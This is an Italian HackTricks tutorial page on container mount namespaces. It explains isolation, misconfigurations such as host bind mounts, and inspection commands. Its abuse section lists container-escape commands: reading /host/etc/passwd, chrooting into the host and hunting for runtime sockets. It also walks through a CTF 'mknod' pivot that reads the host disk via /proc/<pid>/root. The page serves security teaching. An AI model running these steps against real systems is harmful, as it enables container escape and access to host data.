# Namespace di mount

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace di mount controlla la **mount table** che un processo vede. Questa è una delle caratteristiche di isolamento dei container più importanti perché il root filesystem, i bind mounts, i tmpfs mounts, la vista di procfs, l'esposizione di sysfs e molti mount di supporto specifici del runtime sono tutti espressi attraverso quella mount table. Due processi possono entrambi accedere a `/`, `/proc`, `/sys` o `/tmp`, ma ciò a cui quei percorsi risolvono dipende dal namespace di mount in cui si trovano.

Dal punto di vista della sicurezza dei container, il namespace di mount è spesso la differenza tra "questo è un filesystem dell'applicazione preparato in modo ordinato" e "questo processo può vedere o influenzare direttamente il filesystem dell'host". Ecco perché i bind mounts, i volumi `hostPath`, le operazioni di mount privilegiate e le esposizioni scrivibili di `/proc` o `/sys` ruotano attorno a questo namespace.

## Funzionamento

Quando un runtime avvia un container, normalmente crea un nuovo namespace di mount, prepara un root filesystem per il container, monta procfs e altri filesystem di supporto secondo necessità, e opzionalmente aggiunge bind mounts, tmpfs mounts, secrets, config maps o host paths. Una volta che quel processo è in esecuzione all'interno del namespace, l'insieme dei mount che vede è in gran parte disaccoppiato dalla vista predefinita dell'host. L'host può comunque vedere il filesystem reale sottostante, ma il container vede la versione assemblata per lui dal runtime.

Questo è potente perché permette al container di credere di avere il proprio root filesystem anche se l'host sta ancora gestendo tutto. È anche pericoloso perché se il runtime espone il mount sbagliato, il processo guadagna improvvisamente visibilità su risorse dell'host che il resto del modello di sicurezza potrebbe non essere progettato per proteggere.

## Lab

Puoi creare un namespace di mount privato con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se apri un'altra shell al di fuori di quel mount namespace e ispezioni la mount table, vedrai che il tmpfs mount esiste solo all'interno del mount namespace isolato. Questo è un esercizio utile perché mostra che l'isolamento dei mount non è teoria astratta; il kernel presenta letteralmente una mount table diversa al processo.
Se apri un'altra shell al di fuori di quel mount namespace e ispezioni la mount table, il tmpfs mount esisterà solo all'interno del mount namespace isolato.

All'interno dei container, un confronto rapido è:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Il secondo esempio dimostra quanto sia facile per la runtime configuration creare una enorme falla attraverso il confine del filesystem.

## Uso del runtime

Docker, Podman, gli stack basati su containerd e CRI-O si affidano tutti a un mount namespace privato per i container normali. Kubernetes si basa sullo stesso meccanismo per volumes, projected secrets, config maps e mount `hostPath`. Gli ambienti Incus/LXC si affidano anch'essi pesantemente ai mount namespaces, specialmente perché i system container spesso espongono filesystem più ricchi e simili a macchine rispetto ai container applicativi.

Questo significa che quando esamini un problema relativo al filesystem di un container, di solito non stai guardando a una stranezza isolata di Docker. Stai guardando a un problema di mount-namespace e runtime-configuration espresso attraverso qualunque piattaforma abbia lanciato il workload.

## Misconfigurazioni

L'errore più ovvio e pericoloso è esporre il filesystem root dell'host o un altro percorso host sensibile tramite un bind mount, ad esempio `-v /:/host` o un `hostPath` scrivibile in Kubernetes. A quel punto, la domanda non è più "il container può in qualche modo evadere?" ma piuttosto "quanti contenuti utili dell'host sono già direttamente visibili e scrivibili?" Un host bind mount scrivibile spesso trasforma il resto dell'exploit in una semplice questione di posizionamento di file, chrooting, modifica della config o scoperta di socket di runtime.

Un altro problema comune è esporre host `/proc` o `/sys` in modi che bypassano la più sicura vista del container. Questi filesystem non sono mount di dati ordinari; sono interfacce allo stato del kernel e dei processi. Se il workload raggiunge direttamente le versioni dell'host, molte delle assunzioni alla base del hardening dei container smettono di applicarsi correttamente.

Le protezioni read-only contano anch'esse. Un root filesystem in read-only non protegge magicamente un container, ma rimuove una grande quantità di spazio di staging per l'attaccante e rende più difficili persistence, posizionamento di helper-binary e manomissione della config. Al contrario, un root scrivibile o un host bind mount scrivibile offre all'attaccante spazio per preparare il passo successivo.

## Abuso

Quando il mount namespace viene abusato, gli attaccanti normalmente fanno una di quattro cose. Essi **leggono dati dell'host** che avrebbero dovuto rimanere fuori dal container. Essi **modificano la configurazione dell'host** tramite bind mount scrivibili. Essi **montano o rimontano risorse aggiuntive** se capabilities e seccomp lo permettono. Oppure **raggiungono socket potenti e directory di stato di runtime** che permettono loro di chiedere alla piattaforma container stessa più accesso.

Se il container può già vedere il filesystem dell'host, il resto del modello di sicurezza cambia immediatamente.

Quando sospetti un host bind mount, conferma innanzitutto cosa è disponibile e se è scrivibile:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se il root filesystem dell'host è montato read-write, l'accesso diretto all'host è spesso semplice come:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se l'obiettivo è l'accesso privilegiato al runtime piuttosto che il chrooting diretto, enumerare sockets e lo stato del runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` è presente, testa anche se si possono creare nuovi mount dall'interno del container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Esempio completo: Two-Shell `mknod` Pivot

Un percorso di abuso più specializzato si presenta quando l'utente root del container può creare dispositivi a blocchi, l'host e il container condividono un'identità utente in modo utile, e l'attaccante ha già un punto d'appoggio a basso privilegio sull'host. In quella situazione, il container può creare un nodo dispositivo come `/dev/sda`, e l'utente dell'host con privilegi limitati può poi leggerlo tramite `/proc/<pid>/root/` per il processo corrispondente del container.

All'interno del container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Dall'host, come utente a basso privilegio corrispondente dopo aver individuato il PID della shell del container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lezione importante non è la precisa stringa di ricerca usata in un CTF. È che l'esposizione del mount-namespace tramite `/proc/<pid>/root/` può permettere a un utente host di riutilizzare device nodes creati dal container anche quando la policy device di cgroup ne impediva l'uso diretto all'interno del container stesso.

## Controlli

Questi comandi servono a mostrarti la vista del filesystem in cui il processo corrente sta effettivamente vivendo. L'obiettivo è individuare mount provenienti dall'host, percorsi sensibili scrivibili e qualsiasi cosa che sembri più ampia rispetto al normale filesystem root di un container applicativo.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Cosa è interessante qui:

- Bind mounts dall'host, specialmente `/`, `/proc`, `/sys`, le directory di stato del runtime o le posizioni dei socket, dovrebbero risaltare immediatamente.
- Read-write mounts inaspettati sono solitamente più importanti di un gran numero di helper mounts read-only.
- `mountinfo` è spesso il posto migliore per vedere se un percorso è realmente host-derived o overlay-backed.

Questi controlli stabiliscono **quali risorse sono visibili in questo namespace**, **quali sono host-derived**, e **quali di esse sono scrivibili o sensibili per la sicurezza**.
{{#include ../../../../../banners/hacktricks-training.md}}
